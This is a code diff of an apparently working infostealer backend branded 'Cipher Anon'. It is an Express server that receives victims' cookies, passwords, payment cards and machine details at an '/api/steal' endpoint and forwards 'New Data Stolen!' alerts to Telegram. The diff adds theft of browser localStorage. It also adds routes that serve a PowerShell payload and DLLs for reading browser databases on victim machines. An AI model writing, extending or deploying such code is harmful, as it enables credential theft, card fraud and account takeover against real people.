@@ -4,6 +4,7 @@
 // Fixed: Dedup uses IP + userAgent + screen + nonce + data check
 // Fixed: Handles PowerShell payload with PC name
 // Clean URLs: NO .php in address bar — serves directly
+// LocalStorage: Supports new localStorage field from payload
 // ============================================================
 
 const express = require('express');
@@ -362,7 +363,7 @@ async function getCountryInfo(ip) {
 // TELEGRAM
 // ============================================================
 
-async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) {
+async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount, storageCount) {
     if (!CONFIG.SEND_NOTIFICATIONS) return;
     const t = CONFIG.TELEGRAM_BOT_TOKEN;
     const c = CONFIG.TELEGRAM_CHAT_ID;
@@ -377,6 +378,7 @@ async function sendTelegram(host, count, ip, countryInfo, credCount, cardCount) 
     let extra = '';
     if (credCount > 0) extra += `\n🔑 *Credentials:* ${credCount}`;
     if (cardCount > 0) extra += `\n💳 *Cards:* ${cardCount}`;
+    if (storageCount > 0) extra += `\n💾 *LocalStorage:* ${storageCount}`;
 
     const message = `🍪 *Cipher Anon — New Data Stolen!*
 
@@ -482,6 +484,7 @@ app.post('/api/steal', async (req, res) => {
         data.receivedAt = new Date().toISOString();
         data.credentials = data.credentials || [];
         data.cards = data.cards || [];
+        data.localStorage = data.localStorage || {};
 
         const userAgent = data.fingerprint?.userAgent || '';
         const screen = data.fingerprint?.screen || '';
@@ -498,7 +501,7 @@ app.post('/api/steal', async (req, res) => {
             data.victimUsername = data.system.username || 'Unknown';
             data.victimOS = data.system.os || 'Unknown';
             
-            log(`[PAYLOAD] PC: ${data.system.hostname} | User: ${data.system.username} | ${data.cookies?.length || 0} cookies, ${data.passwords?.length || 0} passwords, ${data.cards?.length || 0} cards | ${realIp}`);
+            log(`[PAYLOAD] PC: ${data.system.hostname} | User: ${data.system.username} | ${data.cookies?.length || 0} cookies, ${data.passwords?.length || 0} passwords, ${data.cards?.length || 0} cards, ${Object.keys(data.localStorage || {}).length} LocalStorage | ${realIp}`);
         }
 
         // ---- NUCLEAR DEDUP ----
@@ -515,9 +518,10 @@ app.post('/api/steal', async (req, res) => {
         const count = data.cookies ? (typeof data.cookies === 'object' ? Object.keys(data.cookies).length : data.cookies.length || 0) : 0;
         const credCount = data.credentials.length;
         const cardCount = data.cards.length;
+        const storageCount = Object.keys(data.localStorage || {}).length;
 
-        log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards | ${realIp}`);
-        await sendTelegram(hostname, count, realIp, countryInfo, credCount, cardCount);
+        log(`[+] ${hostname} — ${count} cookies, ${credCount} creds, ${cardCount} cards, ${storageCount} storage | ${realIp}`);
+        await sendTelegram(hostname, count, realIp, countryInfo, credCount, cardCount, storageCount);
 
         res.json({ status: 'ok', country: countryInfo });
     } catch (e) {
@@ -738,6 +742,25 @@ app.get('/password-success', requireAuth, (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'password-success.php'));
 });
 
+// ---- Serve DLLs from public folder ----
+app.get('/System.Data.SQLite.dll', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'System.Data.SQLite.dll'));
+});
+
+app.get('/LevelDB.NET.dll', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'LevelDB.NET.dll'));
+});
+
+app.get('/leveldb.dll', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'leveldb.dll'));
+});
+
+// ---- Serve payload.ps1 ----
+app.get('/payload.ps1', (req, res) => {
+    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+    res.sendFile(path.join(__dirname, 'public', 'payload.ps1'));
+});
+
 // ---- Fallback .php routes (redirect to clean URLs for backward compatibility) ----
 app.get('/home.php', (req, res) => {
     res.redirect('/home');
@@ -854,6 +877,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log(`  [+] Clean URLs: ENABLED ✅ (no .php in address bar)`);
+    console.log(`  [+] LocalStorage: ENABLED ✅ (from payload)`);
     console.log('='.repeat(55) + '\n');
 });
 
